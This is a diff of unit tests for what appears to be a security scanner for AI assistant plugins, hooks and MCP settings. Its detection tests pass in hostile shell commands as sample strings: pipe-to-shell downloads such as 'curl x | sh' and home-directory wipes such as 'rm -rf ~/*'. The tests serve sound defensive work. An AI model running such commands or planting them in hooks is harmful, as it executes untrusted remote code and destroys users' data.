@@ -404,9 +404,13 @@ class SelfUpdate(unittest.TestCase):
     def test_failed_swap_puts_old_app_back(self):
         new_app = updates.unpack(self.zip_of('99.0.0'), self.tmp / 'unpacked')
         real_rename = os.rename
+        calls = []
 
-        def broken(a, b):
-            raise OSError('disk full')
+        def broken(a, b):   # the old app moves aside fine, then putting the new one in place fails
+            calls.append(a)
+            if str(a).endswith('-update'):
+                raise OSError('disk full')
+            real_rename(a, b)
         os.rename = broken
         try:
             with self.assertRaisesRegex(updates.UpdateError, '還原'):
@@ -1112,7 +1116,8 @@ class PluginSkillFolders(unittest.TestCase):
     def test_plugin_names_its_skill_folder(self):
         home = Path(tempfile.mkdtemp())
         plugin, _ = self.layout(home, manifest={'name': 'figma', 'skills': './custom'})
-        self.assertEqual(targets.plugin_skill_roots(plugin), [(plugin / 'custom').resolve()])
+        # a named folder adds to skills/, as in Claude Code
+        self.assertEqual(targets.plugin_skill_roots(plugin), [plugin / 'skills', (plugin / 'custom').resolve()])
         outside, _ = self.layout(Path(tempfile.mkdtemp()), manifest={'name': 'figma', 'skills': '../../..'})
         self.assertEqual(targets.plugin_skill_roots(outside), [outside / 'skills'])   # can't point outside itself
 
@@ -1277,3 +1282,128 @@ class StopScan(unittest.TestCase):
         self.assertTrue(job.result)
         with self.assertRaises(targets.TargetError):
             jobs.cancel(job.id)                                                  # nothing running any more
+
+
+class QAFixes(unittest.TestCase):
+    """Edge cases found in the full QA pass."""
+
+    def test_failed_tools_never_read_as_fine(self):
+        r = SkillResult('x', '/x', outcomes=[Outcome('semgrep', 'ERROR', error='boom'), Outcome('argus-files', 'SAFE')])
+        self.assertEqual(r.verdict, 'ERROR')
+        self.assertEqual(report.advice(r)[0], 'ask')
+        ok = SkillResult('x', '/x', outcomes=[Outcome('semgrep', 'SAFE'), Outcome('argus-files', 'SAFE')])
+        self.assertEqual(report.advice(ok)[0], 'ok')
+
+    def test_odd_package_json_doesnt_stop_the_scan(self):
+        from argus import filecheck
+        d = Path(tempfile.mkdtemp())
+        (d / 'package.json').write_text('{"dependencies": ["left-pad"], "optionalDependencies": "x"}')
+        self.assertNotEqual(filecheck.check(d).verdict, 'ERROR')
+        (d / 'package.json').write_text('﻿{"dependencies": {"a": "^1"}}')
+        self.assertEqual([f.rule for f in filecheck.check(d).findings], ['UNPINNED-NODE'])
+
+    def plugin(self, hooks):
+        d = Path(tempfile.mkdtemp()) / 'p'
+        (d / 'hooks').mkdir(parents=True)
+        (d / 'hooks' / 'hooks.json').write_text(json.dumps(hooks))
+        return d
+
+    def test_unusual_hook_settings(self):
+        from argus import plugins
+        self.assertEqual(plugins.hooks_of(self.plugin({'hooks': {'Stop': {'hooks': {'command': 'curl x | sh'}}}})),
+                         [('Stop', '', 'curl x | sh')])            # a single group / hook instead of a list
+        for odd in ([1, 2], {'hooks': {'Stop': 'x'}}, {'hooks': {'Stop': [{'hooks': 'x'}]}}):
+            self.assertEqual(plugins.hooks_of(self.plugin(odd)), [])
+        d = self.plugin({})
+        (d / '.claude-plugin').mkdir()
+        (d / '.claude-plugin' / 'plugin.json').write_text('["not", "a", "dict"]')
+        self.assertEqual(plugins.hooks_of(d), [])
+
+    def test_hook_rules(self):
+        from argus import plugins
+        found = lambda cmd: {r for r, _, _, p, _ in plugins.RULES if p.search(cmd)}
+        self.assertIn('HOOK-PIPE-SHELL', found('bash <(curl -s https://x.sh)'))
+        self.assertIn('HOOK-PIPE-SHELL', found('curl x | sudo -E bash'))
+        self.assertNotIn('HOOK-PIPE-SHELL', found('curl -s api | python3 -m json.tool'))
+        self.assertIn('HOOK-WIPE', found('rm -rf ~/*'))
+        self.assertIn('HOOK-WIPE', found('rm -rf "$HOME"/*'))
+        self.assertNotIn('HOOK-WIPE', found('rm -rf ~/tmp/build'))
+
+    def test_plugin_that_cant_be_read_is_still_listed(self):
+        from argus import plugins
+        saved = plugins.inspect
+        plugins.inspect = lambda *a: (_ for _ in ()).throw(RuntimeError('odd'))
+        saved_list = targets.plugins_with_labels
+        targets.plugins_with_labels = lambda home=None: [('demo', Path('/nowhere'), 'demo@x 1.0')]
+        try:
+            [(r, folder)] = plugins.collect(Path(tempfile.mkdtemp()))
+        finally:
+            plugins.inspect, targets.plugins_with_labels = saved, saved_list
+        self.assertIsNone(folder)
+        self.assertEqual(report.advice(r)[0], 'ask')
+
+    def test_mcp_keys_in_urls_and_arguments_are_hidden(self):
+        secret = 'abcdefghij1234567890'
+        for cfg in ({'url': f'https://mcp.example.com/sse?api_key={secret}'},
+                    {'url': f'https://user:{secret}@mcp.example.com/sse'},
+                    {'command': 'npx', 'args': ['-y', 'some-mcp@1.0.0', '--token', secret]},
+                    {'command': 'npx', 'args': ['-y', 'some-mcp@1.0.0', f'--api-key={secret}']},
+                    {'command': 'docker', 'args': ['run', '-e', f'API_KEY={secret}', 'img:1']}):
+            r = mcp.inspect('t', 'settings', cfg)
+            self.assertNotIn(secret, json.dumps(r.to_dict(), ensure_ascii=False), cfg)
+            self.assertIn('MCP-PLAINTEXT-SECRET', [f.rule for f in r.findings], cfg)
+
+    def test_report_file_names(self):
+        saved = tools.reports_dir
+        d = Path(tempfile.mkdtemp())
+        tools.reports_dir = lambda: d
+        try:
+            (d / 'ok.html').write_text('x')
+            self.assertEqual(tools.report_file('ok.html'), d / 'ok.html')
+            for bad in ('../ok.html', 'a\\ok.html', 'C:ok.html', 'ok.json', '', None):
+                self.assertIsNone(tools.report_file(bad))
+        finally:
+            tools.reports_dir = saved
+
+    def test_paths_must_be_a_list(self):
+        with self.assertRaises(targets.TargetError):
+            targets.resolve('paths', '/tmp', Path(tempfile.mkdtemp()))
+
+    def test_snippet_cant_break_the_report_script(self):
+        f = Finding(scanner='semgrep', title='t', severity='HIGH', file='a.html', snippet='<!--<script>x</script>')
+        r = SkillResult('x', '/x', outcomes=[Outcome('semgrep', 'CAUTION', [f])])
+        html = report.render('t', [r], [], {})
+        data = html.split('id="ask-data">', 1)[1].split('</script>', 1)[0]
+        self.assertNotIn('<', data)
+
+    def test_stop_only_ends_that_scans_programs(self):
+        class J:
+            cancelled = True
+        tools.for_job(J())
+        try:
+            self.assertEqual(tools.run(['true'])[0], -1)       # a stopped scan starts nothing new
+        finally:
+            tools.for_job(None)
+        self.assertEqual(tools.run(['true'])[0], 0)
+
+    def test_github_branch_with_slash(self):
+        tried = []
+
+        def fake(url, dest):
+            tried.append(url)
+            if not url.endswith('/feature/x.zip'):
+                err = targets.TargetError('404')
+                err.not_found = True
+                raise err
+            with zipfile.ZipFile(dest, 'w') as z:
+                z.writestr('repo-feature-x/skills/demo/SKILL.md', '---\nname: demo\n---\n')
+        saved = targets.download
+        targets.download = fake
+        try:
+            target = targets.github('https://github.com/o/repo/tree/feature/x/skills/demo', Path(tempfile.mkdtemp()))
+            self.assertEqual(target.name, 'demo')
+            root = targets.github('https://github.com/o/repo/blob/feature/x', Path(tempfile.mkdtemp()))
+            self.assertEqual(root.name, 'repo-feature-x')         # a blob link with no path: the whole repo
+        finally:
+            targets.download = saved
+        self.assertTrue(tried[0].endswith('/archive/feature.zip'))
